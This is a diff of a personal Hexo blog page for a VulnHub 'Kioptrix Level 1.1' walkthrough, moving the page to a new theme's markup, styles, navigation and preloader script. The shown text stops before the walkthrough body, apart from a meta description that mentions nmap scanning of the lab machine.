@@ -1,718 +1,1180 @@
 <!DOCTYPE html>
-<html lang="zh-Hans">
-
+<html lang="en">
 <head>
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-<meta name="x5-fullscreen" content="true">
-<meta name="full-screen" content="yes">
-<meta name="theme-color" content="#317EFB" />
-<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
-<meta name="description" content="Kioptrix Level 1.1(#2)  参考 Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io)   渗透思路  信息收集  nmap扫描ip，得到IP为192.168.89.138 nmap扫描端口及端口服务  1234567891011121314151">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="MADISUN">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://madifaye.github.io/2024/02/03/kioptrix_level_1.1/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="Kioptrix Level 1.1(#2) 参考 Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io)   渗透思路信息收集 nmap扫描ip，得到IP为192.168.89.138 nmap扫描端口及端口服务  12345678910111213141516Star">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Kioptrix Level 1.1(#2)">
 <meta property="og:url" content="https://madifaye.github.io/2024/02/03/Kioptrix_Level_1.1/index.html">
 <meta property="og:site_name" content="Mad1sun个人博客">
-<meta property="og:description" content="Kioptrix Level 1.1(#2)  参考 Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io)   渗透思路  信息收集  nmap扫描ip，得到IP为192.168.89.138 nmap扫描端口及端口服务  1234567891011121314151">
-<meta property="og:locale">
-<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
-<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
-<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
-<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
-<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
-<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
-<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
-<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
-<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
-<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
-<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
-<meta property="og:image" content="https://madifaye.github.io/img/404.jpg">
+<meta property="og:description" content="Kioptrix Level 1.1(#2) 参考 Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io)   渗透思路信息收集 nmap扫描ip，得到IP为192.168.89.138 nmap扫描端口及端口服务  12345678910111213141516Star">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://madifaye.github.io/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.08.05.png">
+<meta property="og:image" content="https://madifaye.github.io/2024/02/03/Kioptrix_Level_1.1/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.09.55.png">
+<meta property="og:image" content="https://madifaye.github.io/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.35.22.png">
+<meta property="og:image" content="https://madifaye.github.io/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.48.17.png">
+<meta property="og:image" content="https://madifaye.github.io/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.50.46.png">
+<meta property="og:image" content="https://madifaye.github.io/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%886.01.38.png">
+<meta property="og:image" content="https://madifaye.github.io/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.46.56.png">
+<meta property="og:image" content="https://madifaye.github.io/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.54.18.png">
+<meta property="og:image" content="https://madifaye.github.io/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.09.57.png">
+<meta property="og:image" content="https://madifaye.github.io/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.13.18.png">
+<meta property="og:image" content="https://madifaye.github.io/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.16.41.png">
+<meta property="og:image" content="https://madifaye.github.io/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.23.15.png">
 <meta property="article:published_time" content="2024-02-03T09:08:24.026Z">
-<meta property="article:modified_time" content="2024-02-28T05:50:01.497Z">
+<meta property="article:modified_time" content="2024-03-09T09:10:53.704Z">
 <meta property="article:author" content="Mad1sun">
 <meta property="article:tag" content="vulnhub">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://madifaye.github.io/img/404.jpg">
+<meta name="twitter:image" content="https://madifaye.github.io/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.08.05.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/rainbow.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/rainbow.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/rainbow.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Kioptrix Level 1.1(#2) -
+        
+        Mad1sun&#39;s BL0G~
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
 
 
-<title >Kioptrix Level 1.1(#2)</title>
+    <!--- Inject Part-->
+    
 
-<!-- Favicon -->
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
 
-    <link href='/rainbow.svg?v=2.1.10' rel='icon' type='image/png' sizes='16x16' ></link>
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Mad1sun&#39;s BL0G~
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
 
 
-    <link href='/rainbow.svg?v=2.1.10' rel='icon' type='image/png' sizes='32x32' ></link>
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
 
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
 
-    <link href='/rainbow.svg?v=2.1.10' rel='apple-touch-icon' sizes='180x180' ></link>
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
 
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
 
-    <link href='/site.webmanifest' rel='manifest' ></link>
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
 
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
 
-<!-- Plugin -->
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
 
-
+    
+<link rel="stylesheet" href="/css/style.css">
 
 
     
-<link rel="stylesheet" href="/css/plugins/bootstrap.row.css">
-
-    
-<link rel="stylesheet" href="https://npm.elemecdn.com/@fancyapps/ui@4.0/dist/fancybox.css">
-
-    
-<link rel="stylesheet" href="https://npm.elemecdn.com/swiper@4.5.1/dist/css/swiper.min.css">
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
 
     
 
-
-
-
-<!-- Icon -->
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
 
     
-<link rel="stylesheet" href="/css/plugins/font-awesome.min.css">
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
 
-
-
-
-<!-- Variable -->
-<script>window.ASYNC_CONFIG = {"hostname":"madifaye.github.io","author":"Mad1sun","root":"/","typed_text":["Mad1sun:)"],"theme_version":"2.1.10","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":"rainbow.svg","icon16":"rainbow.svg","icon32":"rainbow.svg","appleTouchIcon":"rainbow.svg","webmanifest":"/site.webmanifest","visibilitychange":true,"hidden":"failure.ico","showText":"(/≧▽≦/)咦！又好了！","hideText":"(●—●)喔哟，崩溃啦！"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":false,"plugin":{"flickr_justified_gallery":"https://npm.elemecdn.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","user_tag":"fas fa-user-alt","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"mac","height_limit":200},"toc":{"post_title":false},"live_time":{"start_time":"02/27/2024 08:08:08","prefix":"博客已悄悄地运行 undefined 天啦～欢迎你的到来～"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"trigger":"auto","path":"search.xml"}};</script>
-<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-02-28 13:50:01"};</script>
-
-<!-- Theme mode css -->
-<link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.1.10" id="trm-switch-style">
-<script>
-    let defaultMode = ASYNC_CONFIG.theme.default !=='auto' ?  ASYNC_CONFIG.theme.default : (window.matchMedia("(prefers-color-scheme: light)").matches ? 'style-light' : 'style-dark')
-    let catchMode = localStorage.getItem('theme-mode') || defaultMode;
-    let type = catchMode === 'style-dark' ? 'add' : 'remove';
-    document.documentElement.classList[type]('dark')
-</script>
-
-<!-- CDN -->
-
-
+    <!--- Font Part-->
+    
+        <link href="https://fonts.cdnfonts.com/css/komix" rel="stylesheet">
+    
+    
+    
+        <link href="https://192960944.r.cdn36.com/chinesefonts3/packages/jhlst/dist/京華老宋体v1_007/result.css" rel="stylesheet">
     
     
 
 
+    <script id="hexo-configurations">
+    window.config = {"hostname":"madifaye.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":"KingHwa_OldSong","url":"https://192960944.r.cdn36.com/chinesefonts3/packages/jhlst/dist/京華老宋体v1_007/result.css"},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/image/grand_budapest.jpg","dark":"/image/before_sunset.jpg"},"title":"MAD1SUN'S BLOG","subtitle":{"text":["Im Mad1sun.","Carpe Diem"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#c30452","dark":"#c32504"},"text_style":{"title_size":"4.0rem","subtitle_size":"1.8rem","line_height":1.2},"custom_font":{"enable":true,"family":"\"Komix\",sans-serif","url":"https://fonts.cdnfonts.com/css/komix"},"social_links":{"enable":true,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":"xqlmadison@outlook.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"Probably Up","artist":"Lawrence","url":"http://music.163.com/outchain/player?type=2&id=865052867&auto=1&height=66","cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"},"Categories":{"icon":"fa-solid fa-folder","path":"/categories/"}},"search":{"enable":true,"preload":true},"tags":{"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"}},"categories":{"Categories":{"icon":"fa-solid fa-folder","path":"/categories/"}}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"你常活在光明里。","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/2/27 08:08:08"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
 
-<!-- Site Analytics -->
- 
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
 <meta name="generator" content="Hexo 7.1.1"></head>
 
+
 <body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
 
-  <!-- app wrapper -->
-  <div class="trm-app-frame">
-
-    <!-- page preloader -->
-    <div class="trm-preloader">
-    <div class="trm-holder">
-        <div class="preloader">
-            <div></div>
-            <div></div>
-            <div></div>
-            <div></div>
-            <div></div>
-            <div></div>
-            <div></div>
-            <div></div>
-            <div></div>
-            <div></div>
-        </div>
-    </div>
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
 </div>
-    <!-- page preloader end -->
 
-    <!-- change mode preloader -->
-    <div class="trm-mode-swich-animation-frame">
-    <div class="trm-mode-swich-animation">
-        <i class="i-sun"><i class="iconfont far fa-sun"></i></i>
-        <div class="trm-horizon"></div>
-        <i class="i-moon"><i class="iconfont far fa-moon"></i></i>
-    </div>
-</div>
-    <!-- change mode preloader end -->
 
-      <!-- scroll container -->
-      <div id="trm-dynamic-content" class="trm-swup-animation">
-        <div id="trm-scroll-container" class="trm-scroll-container" style="opacity: 0">
-            <!-- top bar -->
-            <header class="trm-top-bar">
-	<div class="container">
-		<div class="trm-left-side">
-			<!-- logo -->
-<a href="/" class="trm-logo-frame trm-anima-link">
+<main class="page-container" id="swup">
+
     
-        <img alt="logo" src="/rainbow.svg">
-    
-    
-        <div class="trm-logo-text">
-            Mad1sun<span>Handle</span>
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Mad1sun&#39;s BL0G~
+                
+            </a>
         </div>
-    
-</a>
-<!-- logo end -->
-		</div>
-		<div class="trm-right-side">
-			<!-- menu -->
-<div class="trm-menu">
-    <nav>
-        <ul>
-            
-            <li class="menu-item-has-children ">
-                <a  href="/" target="">
-                    主页
-                </a>
-                
-            </li>
-            
-            <li class="menu-item-has-children ">
-                <a  href="/archives/" target="">
-                    归档
-                </a>
-                
-            </li>
-            
-            <li class="menu-item-has-children ">
-                <a  href="/categories/" target="">
-                    分类
-                </a>
-                
-            </li>
-            
-            <li class="menu-item-has-children ">
-                <a  href="/tags/" target="">
-                    标签
-                </a>
-                
-            </li>
-            
-        </ul>
-    </nav>
-</div>
-<!-- menu end -->
-			
-    <!-- mode switcher place -->
-    <div class="trm-mode-switcher-place">
-        <div class="trm-mode-switcher">
-            <i class="iconfont far fa-sun"></i>
-            <input class="tgl tgl-light" id="trm-swich" type="checkbox">
-            <label class="trm-swich" for="trm-swich"></label>
-            <i class="iconfont far fa-moon"></i>
-        </div>
-    </div>
-    <!-- mode switcher place end -->
 
-			
-    
-    <div id="trm-search-btn" class="trm-search-btn">
-        <i class="iconfont fas fa-search"></i>
-    </div>
-     
-
-		</div>
-		<div class="trm-menu-btn">
-			<span></span>
-		</div>
-	</div>
-</header>
-            <!-- top bar end -->
-
-            <!-- body -->
-            
-<div class="trm-content-start">
-    <!-- banner -->
-    <div class="trm-banner">
-    
-    <!-- banner cover -->
-    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" src="/img/banner.png">
-    <!-- banner cover end -->
-    
-
-    <!-- banner content -->
-    <div class="trm-banner-content trm-overlay">
-        <div class="container">
-            <div class="row">
-                
-                <div class="col-lg-12">
-
-                    <!-- banner title -->
-                    <div class="trm-banner-text trm-text-center ">
-                        <div class="trm-label trm-mb-20">
-                            NEWS LETTER
-                        </div>
-                        <h1 class="trm-mb-30 trm-hsmb-font">
-                            Kioptrix Level 1.1(#2)
-                        </h1>
-
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
                         
-                            <ul class="trm-breadcrumbs trm-label">
-                                <li>
-                                    <a href="/" class="trm-anima-link">Home</a>
-                                </li>
-                                <li>
-                                    <span>
-                                        2024
-                                    </span>
-                                </li>
-                            </ul>
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
                         
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-solid fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                     </div>
-                    <!-- banner title end -->
-
-                    <!-- scroll hint -->
-                    <span id="scroll-triger" class="trm-scroll-hint-frame">
-                        <div class="trm-scroll-hint"></div>
-                        <span class="trm-label">Scroll down</span>
-                    </span>
-                    <!-- scroll hint end -->
-
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
                 </div>
             </div>
         </div>
     </div>
-    <!-- banner content end -->
-</div>
-    <!-- banner end -->
-    <div class="container">
-        <div class="row">
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
             
-            <div class="trm-page-content col-lg-12">
-                <div id="trm-content" class="trm-content">
-                    <div class="trm-post-info row hidden-sm">
-    <div class="col-sm-4">
-        <div class="trm-card trm-label trm-label-light text-center">
-            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
-            02/03
-        </div>
-    </div>
-    <div class="col-sm-4">
-        <div class="trm-card trm-label trm-label-light text-center">
-            <i class="iconfont far fa-clock trm-icon"></i><br>
-            17:08
-        </div>
-    </div>
-    <div class="col-sm-4">
-        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
-            <i class="iconfont far fa-user trm-icon"></i><br>
-            Mad1sun
-        </div>
-    </div>
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
 </div>
-<div class="trm-card ">
-    <article id="article-container" class="trm-publication">
-    <h1 id="kioptrix-level-112"><a class="markdownIt-Anchor" href="#kioptrix-level-112"></a> Kioptrix Level 1.1(#2)</h1>
-<blockquote>
-<p>参考 <a target="_blank" rel="noopener" href="https://hummus-ful.github.io/vulnhub/2021/01/25/Kioptrix_2.html">Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io)</a></p>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/image/faye.jpg" alt="Kioptrix Level 1.1(#2)" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">Kioptrix Level 1.1(#2)</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/image/avatar.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">MADISUN</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
